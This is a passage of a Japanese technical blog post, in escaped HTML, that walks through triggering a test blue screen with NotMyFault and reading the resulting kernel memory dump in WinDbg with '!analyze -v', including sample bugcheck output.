    style=&quot;padding-bottom: 116.25000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAXCAYAAAALHW+jAAAACXBIWXMAAAsTAAALEwEAmpwYAAACtElEQVQ4y41Vi1LiQBDk/z9L705F0CJRngbzJuH9CCgE6JseCBUg3LlVU+wuSW/3TO+kdH93h0ajgZpRQ6vVwiJZYDqdYjwea4xGo9N8MpnoOtvLz+M4VpyS6ziYzeaYz+fyO8NisdDgerlcYrVancXX19dVcP/7+xv9fh8ly7IwHA6x2Wzgey4s6xPDwQCdTgczAU2EcZIkGjyQ7IuCBIIgQMkRhly4rodYTojjCIEfoNfrwdffCK7jwvN8YbwCx263w36/PwXXHAMhUrJtB2EQwjTfNAeddgfNRhP1ehONel2YWpKCRGWlaaovZkDZyOYK6Lqu6rc/bUymM+yOJ26321PkRx4sY3cG6Hme5sA0TNgiLQxDlchfylXpIjcMmQJf8xTHfZ0nyersgBNDVrXyXIFRM1GtvEhU8fryKntVlJ/KqFQqqNUMPP55QLn8jF/3v2EIgc+ujVQUXAEmkqOu1VUm3pGNbdtaHNoqFJZUwSrzJbriskDngGKJVqsDR6RSiiOFoqxBf6DeGo3GKBqFOaRt6EFPbEOb9AWIOdwcK3pZjHwUMiTger0W6wQqOerFKpU3gA9ut7uzqubnNwHJMBCplEuDbzZpobyi9Q3AtYCFmjuC0ugEpnVofBr7EvSfgLwBzCGlssIE5h5TsUyWJ3P/GJA3xVew8JBL/2De+XxxBfCjoihDL0Bb7vFH5wOR9DYyHY8nNyv8X8DhcKSsxtJE05xlikDy+4XGvswPH0rT7VmDOFhoq4cx9rkmctUcimyRDb7cajbxIPeYKeHNCcMAT49PMExTr+EZIO8sB72YnZ4P7s/kHvPbMZX2xmvKZnJYT9UJ2Th9AvjQrdaetffsO5MF1+zu7VYTb2+m9II2ut0uSu/v70qVfS+KIv163Qr+z+eyIIBhGKhWKyqfHf8vf4PZY60odpIAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/56332a5e1b75d8bd5ca15658b2030727/8ac56/image-18.webp 240w,
/static/56332a5e1b75d8bd5ca15658b2030727/2a0bc/image-18.webp 396w&quot;
              sizes=&quot;(max-width: 396px) 100vw, 396px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/56332a5e1b75d8bd5ca15658b2030727/8ff5a/image-18.png 240w,
/static/56332a5e1b75d8bd5ca15658b2030727/db910/image-18.png 396w&quot;
            sizes=&quot;(max-width: 396px) 100vw, 396px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/56332a5e1b75d8bd5ca15658b2030727/db910/image-18.png&quot;
            alt=&quot;image-18.png&quot;
            title=&quot;image-18.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;すると、Windowsマシンでブルースクリーンが発生して再起動されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5f27b29b3cbaa39e7cc0bd3d8142b686/0b533/image-19.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 74.58333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAABfklEQVQ4y9VSu04CQRRdYFfEtwFNjMYCY2d8UKiV/6SEXUBRML5NVKLGyn+wsrK0RRvYXVYXKo1+xfHe2eEZUFuKkzs7O/fcc86MouhFKIYJRS9BSZQa9T/gs7Vew4KaKEARhLqJQNLEUMbCIGFiv4wIYWTXru9N0vfYno1RQiRXFujftiRZjfAFik8S9qVNzBw5WLpysX5bRSzvYu70DVHC4qWLtZsKVvJeXbhwxdm+dCuhpjcRqikTwxkb41kboR1LDGDVDFbCzQz+p9HZFtsCbYTcNH/2jqkDRzRws5b2KpP6DM8FD1ZT3rp2JkjwJaVlv0GE8RKiJw6yj5+IP3xg9tgRSjm3sMyLsxR5kkIezgjJ9QBVf8qGygoDTLhZRIyyu3/+xvnTF5Ypq3DOxvShU7+EIOfVbrP5VQjLr2SZCWmDb3TjrorV64pYa9JaIyP5RDqi6VLq75CnkFJlq9iqor256147IU3xy/C7knRT2ZHwV0t/oIcICz2g8AeTP71+51uxDgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/5f27b29b3cbaa39e7cc0bd3d8142b686/8ac56/image-19.webp 240w,
/static/5f27b29b3cbaa39e7cc0bd3d8142b686/d3be9/image-19.webp 480w,
/static/5f27b29b3cbaa39e7cc0bd3d8142b686/b0a15/image-19.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/5f27b29b3cbaa39e7cc0bd3d8142b686/8ff5a/image-19.png 240w,
/static/5f27b29b3cbaa39e7cc0bd3d8142b686/e85cb/image-19.png 480w,
/static/5f27b29b3cbaa39e7cc0bd3d8142b686/0b533/image-19.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/5f27b29b3cbaa39e7cc0bd3d8142b686/0b533/image-19.png&quot;
            alt=&quot;image-19.png&quot;
            title=&quot;image-19.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;再起動後、&lt;code class=&quot;language-text&quot;&gt;C:\Windows&lt;/code&gt;直下に、&lt;code class=&quot;language-text&quot;&gt;MEMORY.DMP&lt;/code&gt;が存在することを確認します。
※ 僕の環境では大体450MBくらいになりました。&lt;/p&gt;
&lt;p&gt;これでカーネルメモリダンプの取得が完了しました。&lt;/p&gt;
&lt;h2 id=&quot;カーネルメモリダンプの解析を行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E3%81%AE%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;カーネルメモリダンプの解析を行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルメモリダンプの解析を行う&lt;/h2&gt;
&lt;h3 id=&quot;windbgにダンプファイルを読み込む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#windbg%E3%81%AB%E3%83%80%E3%83%B3%E3%83%97%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%80&quot; aria-label=&quot;windbgにダンプファイルを読み込む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;WinDbgにダンプファイルを読み込む&lt;/h3&gt;
&lt;p&gt;解析を行うために、WinDbgを管理者権限で起動します。&lt;/p&gt;
&lt;p&gt;次に、[File]から[Open dump file]を選択し、先ほど出力された&lt;code class=&quot;language-text&quot;&gt;MEMORY.DMP&lt;/code&gt;をインポートします。
（メモリダンプがWinDbgに読み込まれるまで数分かかる場合があります。）&lt;/p&gt;
&lt;p&gt;メモリダンプが読み込まれると、以下の出力が確認できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;Loading Dump File &lt;span class=&quot;token namespace&quot;&gt;[C:\Windows\MEMORY.DMP]&lt;/span&gt;
Kernel Bitmap Dump File: Kernel address space is available&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; User address space may not be available&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;

Symbol search path is: srv*
Executable search path is: 
Windows 10 Kernel Version 19041 &lt;span class=&quot;token function&quot;&gt;MP&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;3 procs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; Free x64
Product: WinNt&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; suite: TerminalServer SingleUserTS
Edition build lab: 19041&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;1&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;amd64fre&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;vb_release&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;191206-1406
Machine Name:
Kernel base = 0xfffff800`62600000 PsLoadedModuleList = 0xfffff800`6322a230
Debug session time: Thu Oct  7 20:33:12&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;945 2021 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;UTC &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; 9:00&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
System Uptime: 0 days 0:00:54&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;755
Loading Kernel Symbol&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;メモリダンプ読み込み時の出力を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%80%E3%83%B3%E3%83%97%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF%E6%99%82%E3%81%AE%E5%87%BA%E5%8A%9B%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;メモリダンプ読み込み時の出力を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;メモリダンプ読み込み時の出力を読む&lt;/h3&gt;
&lt;p&gt;前項の出力結果から、次の情報が取得できます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;読み込まれたダンプファイルがカーネルメモリダンプであること&lt;/li&gt;
&lt;li&gt;WindowsのカーネルバージョンとCPUのコア数、bit数&lt;/li&gt;
&lt;li&gt;Kernel base と PsLoadedModuleList のアドレス&lt;/li&gt;
&lt;li&gt;Debug session time：STOPエラー（ブルースクリーン）が発生した時間&lt;/li&gt;
&lt;li&gt;System Uptime：システムがクラッシュまでに稼働していた時間（今回は検証環境なので54秒）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;特に&lt;code class=&quot;language-text&quot;&gt;Debug session time&lt;/code&gt;や&lt;code class=&quot;language-text&quot;&gt;System Uptime&lt;/code&gt;はトラブルシューティングの際に重要な情報になることもあるので、確認しておくとよいでしょう。&lt;/p&gt;
&lt;h3 id=&quot;analyze--v-で自動解析を行う&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#analyze--v-%E3%81%A7%E8%87%AA%E5%8B%95%E8%A7%A3%E6%9E%90%E3%82%92%E8%A1%8C%E3%81%86&quot; aria-label=&quot;analyze  v で自動解析を行う permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;!analyze -v で自動解析を行う&lt;/h3&gt;
&lt;p&gt;次に、以下のコマンドを入力して自動解析を行います。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;analyze &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;v&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最新のWinDbgの自動解析機能はかなり高機能であり、&lt;code class=&quot;language-text&quot;&gt;!analyze -v&lt;/code&gt;コマンドだけでも非常に多くのことがわかります。&lt;/p&gt;
&lt;p&gt;このコマンドを実行すると多くの出力が得られますが、その中からいくつか抜粋して確認していきます。&lt;/p&gt;
&lt;p&gt;まず最初に出力されるのは、クラッシュ原因の解析結果です。
トラブルシューティングの際はまずこの出力を手掛かりにしていくのが効果的な場合もあります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;2: kd&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;analyze &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;v
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                        Bugcheck Analysis                                    &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;                                                                             &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;

DRIVER_IRQL_NOT_LESS_OR_EQUAL &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;d1&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
An attempt was made to access a pageable &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;or completely invalid&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; address at an
interrupt request level &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IRQL&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; that is too high&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;  This is usually
caused by drivers &lt;span class=&quot;token keyword&quot;&gt;using&lt;/span&gt; improper addresses&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;If&lt;/span&gt; kernel debugger is available get stack backtrace&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
Arguments:
Arg1: ffffd8024aaa8010&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; memory referenced
Arg2: 0000000000000002&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; IRQL
Arg3: 0000000000000000&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value 0 = read operation&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; 1 = &lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt; operation
Arg4: fffff80060da1981&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; address which referenced memory&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;今回は、NotMyFaultの&lt;code class=&quot;language-text&quot;&gt;High IRQL Fault(Kernel-mode)&lt;/code&gt;を選択してシステムをクラッシュさせたため、&lt;code class=&quot;language-text&quot;&gt;DRIVER_IRQL_NOT_LESS_OR_EQUAL (d1)&lt;/code&gt;エラーが発生したことが示されています。&lt;/p&gt;
